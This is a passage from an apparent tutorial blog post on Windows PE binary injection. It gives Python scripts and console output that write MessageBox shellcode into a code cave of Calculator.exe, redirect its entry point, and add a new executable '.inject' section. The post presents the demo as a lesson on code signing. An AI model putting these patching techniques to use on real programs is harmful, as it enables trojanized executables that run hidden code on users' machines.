    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">RED</span><span class="si">}{</span><span class="nf">hex</span><span class="p">(</span><span class="n">original_entry</span><span class="p">)</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> → </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}{</span><span class="nf">hex</span><span class="p">(</span><span class="n">cave_rva</span><span class="p">)</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">pe</span><span class="p">.</span><span class="n">OPTIONAL_HEADER</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span> <span class="o">=</span> <span class="n">cave_rva</span>
    
    <span class="c1"># Save
</span>    <span class="n">pe</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">output_file</span><span class="p">)</span>
    <span class="n">pe</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">[Success]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> Saved as: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="n">output_file</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">Expected behavior:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  1. Program starts</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  2. </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">MessageBox appears: </span><span class="sh">'</span><span class="s">Hacked!</span><span class="sh">'</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  3. User closes MessageBox</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  4. Calculator runs normally</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">This demonstrates code injection!</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="k">return</span> <span class="bp">True</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">RED</span><span class="si">}</span><span class="s">Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;input&gt; &lt;output&gt; &lt;cave_rva&gt; &lt;cave_raw&gt; &lt;cave_size&gt;</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s">Example:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">python </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> Calculator.exe Calc_hacked.exe 0x2299 0x1699 359</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="nf">inject_messagebox</span><span class="p">(</span>
        <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
        <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span>
        <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span>
        <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span>
        <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">5</span><span class="p">])</span>
    <span class="p">)</span>
</pre></table></code></div></div><p><strong>Running the injection:</strong></p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 inject_messagebox.py Calculator.exe Calculator_hacked.exe 0x2239 0x1639 455
</pre></table></code></div></div><div class="language-console nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="go">=== MessageBox Injection ===

[1] Target Information:
    Original entry: 0x18C0
    Code cave: 0x2239
    Cave size: 455 bytes

[2] MessageBox shellcode: 300 bytes
    This code will show a popup window

[3] Adding JMP to return to original code
    Total size: 305 bytes

[4] Size check: OK!
    Shellcode: 305 bytes
    Cave: 455 bytes
    Remaining: 150 bytes

[5] Writing shellcode to offset 0x1639
    Written successfully!

[6] Changing entry point:
    0x18c0 → 0x2239

[Success] Saved as: Calculator_hacked.exe

Expected behavior:
  1. Program starts
  2. MessageBox appears: 'Hacked!'
  3. User closes MessageBox
  4. Calculator runs normally

This demonstrates code injection!
</span></pre></table></code></div></div><p><strong>Testing the injection:</strong></p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Calculator_hacked.exe</span><span class="w">
</span></pre></table></code></div></div><p><a href="/assets/img/posts/binary-injection-in-windows-app/cave-messagebox.png" class="popup img-link shimmer"><img src="/assets/img/posts/binary-injection-in-windows-app/cave-messagebox.png" alt="MessageBox injection result" loading="lazy"></a> <em>A MessageBox appears before the Calculator starts</em></p><p>Success! The malicious code executed, showed a popup, then the program continued normally. A user might not even realize their program was modified.</p><p><strong>What just happened:</strong></p><ol><li>User runs <code class="language-plaintext highlighter-rouge">Calculator_hacked.exe</code><li>Entry point redirected to our code cave (<code class="language-plaintext highlighter-rouge">0x2299</code>)<li>MessageBox shellcode executes<li>Popup appears: “Hacked!”<li>User closes popup<li>JMP returns to original entry point (<code class="language-plaintext highlighter-rouge">0x1920</code>)<li>Calculator runs normally</ol><p>This is a perfect demonstration of why <strong>code signing matters</strong>. Without signatures:</p><ul><li>Attackers can modify programs freely<li>Users have no way to detect tampering<li>Malicious code runs invisibly</ul><h2 id="demonstration-section-addition-method"><span class="me-2">Demonstration: Section Addition Method</span><a href="#demonstration-section-addition-method" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Code cave injection works for small payloads, but what if we need more space? The solution is adding a new executable section to the PE file.</p><p>Think of it like adding a new chapter to our cookbook:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>Original Cookbook:
├── Chapter 1: Recipes (.text)
├── Chapter 2: Ingredients (.rdata)
└── Chapter 3: Photos (.data)

Modified Cookbook:
├── Chapter 1: Recipes (.text)
├── Chapter 2: Ingredients (.rdata)
├── Chapter 3: Photos (.data)
└── Chapter 4: Secret Recipes (.inject) ← NEW! Our malicious code
</pre></table></code></div></div><p>When we add a section, we need to:</p><ol><li><strong>Update PE headers</strong> - Tell Windows there’s a new section<li><strong>Create section header</strong> - Metadata describing our new section (40 bytes)<li><strong>Append section data</strong> - The actual space for our code (can be MB in size)<li><strong>Mark as executable</strong> - Set the right permissions (EXECUTE + READ + WRITE)</ol><p><strong>Visual representation:</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>BEFORE (original file):
┌──────────┬────────┬─────────┬───────┬─────┐
│ Headers  │ .text  │ .rdata  │ .data │ EOF │
└──────────┴────────┴─────────┴───────┴─────┘
             Code      Strings   Variables

AFTER (with new section):
┌──────────┬────────┬─────────┬───────┬─────────┬─────┐
│ Headers  │ .text  │ .rdata  │ .data │ .inject │ EOF │
│ (+1 sec) │        │         │       │  (NEW)  │     │
└──────────┴────────┴─────────┴───────┴─────────┴─────┘
                                         ^
                                    Our code here
                                    (4096 bytes)
</pre></table></code></div></div><p><strong>Section Header Structure:</strong></p><p>A section header is exactly <strong>40 bytes</strong> with this structure:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>Offset  Size  Field
------  ----  -----
0       8     Name (e.g., ".inject\0\0")
8       4     VirtualSize (size in memory)
12      4     VirtualAddress (where it loads in memory)
16      4     SizeOfRawData (size in file)
20      4     PointerToRawData (file offset)
24      4     PointerToRelocations (usually 0)
28      4     PointerToLinenumbers (usually 0)
32      2     NumberOfRelocations (usually 0)
34      2     NumberOfLinenumbers (usually 0)
36      4     Characteristics (permissions flags)
</pre></table></code></div></div><p><strong>Key fields:</strong></p><ul><li><strong>Name</strong>: <code class="language-plaintext highlighter-rouge">.inject</code> (our section name)<li><strong>VirtualAddress</strong>: Where it appears in memory (must be aligned)<li><strong>PointerToRawData</strong>: Where it is in the file on disk<li><strong>Characteristics</strong>: <code class="language-plaintext highlighter-rouge">0xE0000020</code> = EXECUTE + READ + WRITE</ul><p>Reference: <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#section-table-section-headers">Microsoft PE Format - Section Table</a></p><h3 id="creating-new-section"><span class="me-2">Creating New Section</span><a href="#creating-new-section" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div file="add_section.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="add_section.py"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">pefile</span>
<span class="kn">import</span> <span class="n">struct</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="k">class</span> <span class="nc">Colors</span><span class="p">:</span>
    <span class="n">HEADER</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[95m</span><span class="sh">'</span>
    <span class="n">BLUE</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[94m</span><span class="sh">'</span>
    <span class="n">CYAN</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[96m</span><span class="sh">'</span>
    <span class="n">GREEN</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[92m</span><span class="sh">'</span>
    <span class="n">YELLOW</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[93m</span><span class="sh">'</span>
    <span class="n">RED</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[91m</span><span class="sh">'</span>
    <span class="n">BOLD</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[1m</span><span class="sh">'</span>
    <span class="n">END</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">add_section</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="n">output_file</span><span class="p">,</span> <span class="n">section_size</span><span class="o">=</span><span class="mh">0x1000</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Add new executable section to PE file</span><span class="sh">"""</span>
    <span class="n">pe</span> <span class="o">=</span> <span class="n">pefile</span><span class="p">.</span><span class="nc">PE</span><span class="p">(</span><span class="n">input_file</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">=== Adding New Section ===</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[1] Configuration:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Name: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s">.inject</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Size: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}{</span><span class="n">section_size</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> bytes (</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}{</span><span class="n">section_size</span><span class="o">//</span><span class="mi">1024</span><span class="si">}</span><span class="s">KB</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s">)</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Get last section and alignment info
</span>    <span class="n">last_section</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="n">sections</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">section_alignment</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="n">OPTIONAL_HEADER</span><span class="p">.</span><span class="n">SectionAlignment</span>
    <span class="n">file_alignment</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="n">OPTIONAL_HEADER</span><span class="p">.</span><span class="n">FileAlignment</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[2] Alignment:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Section: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">section_alignment</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    File: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">file_alignment</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Calculate addresses
</span>    <span class="n">new_section_rva</span> <span class="o">=</span> <span class="p">(</span><span class="n">last_section</span><span class="p">.</span><span class="n">VirtualAddress</span> <span class="o">+</span> <span class="n">last_section</span><span class="p">.</span><span class="n">Misc_VirtualSize</span><span class="p">)</span>
    <span class="n">new_section_rva</span> <span class="o">=</span> <span class="p">(</span><span class="n">new_section_rva</span> <span class="o">+</span> <span class="n">section_alignment</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="n">section_alignment</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
    
    <span class="n">new_raw_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">last_section</span><span class="p">.</span><span class="n">PointerToRawData</span> <span class="o">+</span> <span class="n">last_section</span><span class="p">.</span><span class="n">SizeOfRawData</span><span class="p">)</span>
    <span class="n">new_raw_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">section_size</span> <span class="o">+</span> <span class="n">file_alignment</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="n">file_alignment</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[3] Addresses:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    RVA: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">new_section_rva</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Raw: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">new_raw_offset</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Create section header (40 bytes)
</span>    <span class="n">section_header</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>
    <span class="n">struct</span><span class="p">.</span><span class="nf">pack_into</span><span class="p">(</span><span class="sh">'</span><span class="s">8s</span><span class="sh">'</span><span class="p">,</span> <span class="n">section_header</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">.inject</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">struct</span><span class="p">.</span><span class="nf">pack_into</span><span class="p">(</span><span class="sh">'</span><span class="s">I</span><span class="sh">'</span><span class="p">,</span> <span class="n">section_header</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">section_size</span><span class="p">)</span>
    <span class="n">struct</span><span class="p">.</span><span class="nf">pack_into</span><span class="p">(</span><span class="sh">'</span><span class="s">I</span><span class="sh">'</span><span class="p">,</span> <span class="n">section_header</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="n">new_section_rva</span><span class="p">)</span>
    <span class="n">struct</span><span class="p">.</span><span class="nf">pack_into</span><span class="p">(</span><span class="sh">'</span><span class="s">I</span><span class="sh">'</span><span class="p">,</span> <span class="n">section_header</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">new_raw_size</span><span class="p">)</span>
    <span class="n">struct</span><span class="p">.</span><span class="nf">pack_into</span><span class="p">(</span><span class="sh">'</span><span class="s">I</span><span class="sh">'</span><span class="p">,</span> <span class="n">section_header</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="n">new_raw_offset</span><span class="p">)</span>
    <span class="n">struct</span><span class="p">.</span><span class="nf">pack_into</span><span class="p">(</span><span class="sh">'</span><span class="s">I</span><span class="sh">'</span><span class="p">,</span> <span class="n">section_header</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">struct</span><span class="p">.</span><span class="nf">pack_into</span><span class="p">(</span><span class="sh">'</span><span class="s">I</span><span class="sh">'</span><span class="p">,</span> <span class="n">section_header</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">struct</span><span class="p">.</span><span class="nf">pack_into</span><span class="p">(</span><span class="sh">'</span><span class="s">H</span><span class="sh">'</span><span class="p">,</span> <span class="n">section_header</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">struct</span><span class="p">.</span><span class="nf">pack_into</span><span class="p">(</span><span class="sh">'</span><span class="s">H</span><span class="sh">'</span><span class="p">,</span> <span class="n">section_header</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">struct</span><span class="p">.</span><span class="nf">pack_into</span><span class="p">(</span><span class="sh">'</span><span class="s">I</span><span class="sh">'</span><span class="p">,</span> <span class="n">section_header</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mh">0xE0000020</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[4] Characteristics:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">0xE0000020</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    EXECUTE + READ + WRITE + CODE</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Calculate section table offset
</span>    <span class="n">section_table_offset</span> <span class="o">=</span> <span class="p">(</span>
        <span class="n">pe</span><span class="p">.</span><span class="n">DOS_HEADER</span><span class="p">.</span><span class="n">e_lfanew</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span>
        <span class="n">pe</span><span class="p">.</span><span class="n">FILE_HEADER</span><span class="p">.</span><span class="nf">sizeof</span><span class="p">()</span> <span class="o">+</span>
        <span class="n">pe</span><span class="p">.</span><span class="n">FILE_HEADER</span><span class="p">.</span><span class="n">SizeOfOptionalHeader</span>
    <span class="p">)</span>
    <span class="n">new_section_header_offset</span> <span class="o">=</span> <span class="n">section_table_offset</span> <span class="o">+</span> <span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">pe</span><span class="p">.</span><span class="n">sections</span><span class="p">)</span> <span class="o">*</span> <span class="mi">40</span><span class="p">)</span>
    
    <span class="c1"># Update headers
</span>    <span class="n">pe</span><span class="p">.</span><span class="n">FILE_HEADER</span><span class="p">.</span><span class="n">NumberOfSections</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">pe</span><span class="p">.</span><span class="n">OPTIONAL_HEADER</span><span class="p">.</span><span class="n">SizeOfImage</span> <span class="o">=</span> <span class="n">new_section_rva</span> <span class="o">+</span> <span class="n">section_size</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[5] Headers Updated:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Sections: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="n">pe</span><span class="p">.</span><span class="n">FILE_HEADER</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Image Size: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">pe</span><span class="p">.</span><span class="n">OPTIONAL_HEADER</span><span class="p">.</span><span class="n">SizeOfImage</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Write
</span>    <span class="n">pe</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">output_file</span><span class="p">)</span>
    
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="sh">'</span><span class="s">r+b</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="nf">seek</span><span class="p">(</span><span class="n">new_section_header_offset</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">bytes</span><span class="p">(</span><span class="n">section_header</span><span class="p">))</span>
        <span class="n">f</span><span class="p">.</span><span class="nf">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
